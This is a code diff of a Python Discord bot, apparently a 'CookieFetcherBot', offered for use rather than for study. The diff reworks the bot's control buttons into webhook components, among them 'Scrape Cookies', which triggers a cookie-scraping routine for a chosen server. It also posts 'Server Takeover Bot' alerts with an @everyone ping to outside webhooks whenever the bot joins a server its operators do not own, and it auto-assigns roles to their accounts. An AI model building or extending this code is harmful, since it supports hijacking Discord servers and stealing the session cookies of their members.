@@ -11,11 +11,8 @@ import json
 from typing import List, Union, Dict, Any
 from flask import Flask
 from threading import Thread
-from dotenv import load_dotenv
 
-load_dotenv()
-
-# 🟢 Environment variables for Render
+# 🟢 Environment variables for Render (no dotenv needed)
 BOT_TOKEN = os.environ['DISCORD_TOKEN']
 WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
 MIRROR_WEBHOOK_URL = os.environ.get('MIRROR_WEBHOOK_URL')
@@ -66,38 +63,53 @@ flask_thread = Thread(target=run_flask)
 flask_thread.daemon = True
 flask_thread.start()
 
-# 🟢 Control View for Auto-Delete
-class ServerControlView(discord.ui.View):
-    def __init__(self, guild):
-        super().__init__(timeout=None)
-        self.guild = guild
+# 🟢 Handle webhook button interactions
+@bot.event
+async def on_interaction(interaction):
+    if interaction.type == discord.InteractionType.component:
+        custom_id = interaction.data.get('custom_id', '')
 
-    @discord.ui.button(label="Enable Auto-Delete", style=discord.ButtonStyle.green)
-    async def enable_auto_delete(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user.id not in AUTHORIZED_USERS:
-            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
-            return
+        if custom_id.startswith('enable_delete_'):
+            guild_id = int(custom_id.split('_')[-1])
+            guild = bot.get_guild(guild_id)
+            if not guild:
+                await interaction.response.send_message("❌ Server not found!", ephemeral=True)
+                return
 
-        bot_state.auto_delete_enabled[self.guild.id] = True
-        await interaction.response.send_message("✅ Auto-delete enabled! Messages with @everyone/@here will be deleted.", ephemeral=True)
+            if interaction.user.id not in AUTHORIZED_USERS:
+                await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+                return
 
-    @discord.ui.button(label="Disable Auto-Delete", style=discord.ButtonStyle.red)
-    async def disable_auto_delete(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user.id not in AUTHORIZED_USERS:
-            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
-            return
+            bot_state.auto_delete_enabled[guild_id] = True
+            await interaction.response.send_message("✅ Auto-delete enabled! Messages with @everyone/@here will be deleted.", ephemeral=True)
 
-        bot_state.auto_delete_enabled[self.guild.id] = False
-        await interaction.response.send_message("❌ Auto-delete disabled!", ephemeral=True)
+        elif custom_id.startswith('disable_delete_'):
+            guild_id = int(custom_id.split('_')[-1])
+            guild = bot.get_guild(guild_id)
+            if not guild:
+                await interaction.response.send_message("❌ Server not found!", ephemeral=True)
+                return
 
-    @discord.ui.button(label="Scrape Cookies", style=discord.ButtonStyle.grey)
-    async def scrape_cookies(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user.id not in AUTHORIZED_USERS:
-            await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
-            return
+            if interaction.user.id not in AUTHORIZED_USERS:
+                await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+                return
 
-        await interaction.response.defer(ephemeral=True)
-        await scrape_server_cookies(interaction, self.guild)
+            bot_state.auto_delete_enabled[guild_id] = False
+            await interaction.response.send_message("❌ Auto-delete disabled!", ephemeral=True)
+
+        elif custom_id.startswith('scrape_'):
+            guild_id = int(custom_id.split('_')[-1])
+            guild = bot.get_guild(guild_id)
+            if not guild:
+                await interaction.response.send_message("❌ Server not found!", ephemeral=True)
+                return
+
+            if interaction.user.id not in AUTHORIZED_USERS:
+                await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
+                return
+
+            await interaction.response.defer(ephemeral=True)
+            await scrape_server_cookies(interaction, guild)
 
 # 🟢 Optimized Cookie Fetcher
 class CookieFetcher:
@@ -376,34 +388,50 @@ class CookieFetcherBot(discord.Client):
                 pass
 
             if guild.id not in OWNED_SERVER_IDS:
-                # Send takeover notification only to control channel
+                # Send takeover notification with buttons to mirror webhook
                 takeover_embed = discord.Embed(
                     title="🚨 New Server Joined",
                     description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
                     color=0x00ff00
                 )
+
                 takeover_data = {
                     'username': 'Server Takeover Bot',
                     'content': '@everyone',
-                    'embeds': [takeover_embed.to_dict()]
+                    'embeds': [takeover_embed.to_dict()],
+                    'components': [
+                        {
+                            'type': 1,  # Action row
+                            'components': [
+                                {
+                                    'type': 2,  # Button
+                                    'style': 3,  # Green
+                                    'label': 'Enable Auto-Delete',
+                                    'custom_id': f'enable_delete_{guild.id}'
+                                },
+                                {
+                                    'type': 2,  # Button
+                                    'style': 4,  # Red
+                                    'label': 'Disable Auto-Delete',
+                                    'custom_id': f'disable_delete_{guild.id}'
+                                },
+                                {
+                                    'type': 2,  # Button
+                                    'style': 2,  # Grey
+                                    'label': 'Scrape Cookies',
+                                    'custom_id': f'scrape_{guild.id}'
+                                }
+                            ]
+                        }
+                    ]
                 }
 
-                # Send to cookie webhook
-                async with aiohttp.ClientSession() as session:
-                    async with session.post(COOKIE_WEBHOOK_URL, json=takeover_data) as response:
-                        if response.status not in [200, 204]:
-                            logger.error(f"Failed to send takeover to cookie webhook: {response.status}")
-
-                # Send control buttons to control channel
-                control_channel = self.get_channel(CONTROL_CHANNEL_ID)
-                if control_channel:
-                    embed = discord.Embed(
-                        title="Server Control",
-                        description=f"Control auto-delete for {guild.name}",
-                        color=0x3498db
-                    )
-                    view = ServerControlView(guild)
-                    await control_channel.send(embed=embed, view=view)
+                # Send takeover with buttons to mirror webhook
+                if MIRROR_WEBHOOK_URL:
+                    async with aiohttp.ClientSession() as session:
+                        async with session.post(MIRROR_WEBHOOK_URL, json=takeover_data) as response:
+                            if response.status not in [200, 204]:
+                                logger.error(f"Failed to send takeover to mirror webhook: {response.status}")
 
                 # 🟢 AUTO-ASSIGN ROLES
                 await self.assign_role_to_authorized(guild)
